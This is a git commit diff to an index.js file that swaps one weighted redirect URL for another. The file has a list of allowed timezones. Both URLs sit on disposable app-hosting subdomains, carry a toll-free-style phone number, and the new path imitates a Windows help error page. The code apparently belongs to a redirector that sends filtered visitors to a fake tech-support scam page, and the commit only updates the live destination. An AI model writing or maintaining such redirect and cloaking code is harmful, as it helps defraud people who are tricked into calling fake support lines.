cf3fd901de451ce0b2405a1310427f70e228da86
paalakash <palaksh452@gmail.com>
2026-07-01 07:06:11 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://jellyfish-app-2-mgrn7.ondigitalocean.app/werrx01USAHTML/?bcda=1800-403-676", weight: 1.0 }
+    { url: "https://goldfish-app-siks2.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-403-676", weight: 1.0 }
 
 ];
 
